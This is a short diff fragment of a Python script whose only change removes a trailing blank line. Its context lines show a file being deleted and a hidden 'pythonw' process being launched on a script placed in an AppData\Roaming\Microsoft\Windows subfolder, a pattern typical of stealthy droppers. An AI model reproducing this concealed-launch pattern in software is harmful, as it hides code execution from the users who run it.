@@ -36,4 +36,3 @@ else:
     os.remove(file_path)
 target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
 subprocess.Popen(['pythonw', os.path.join(target_path, "skibidi-mainmain", "main.pyw")])
-
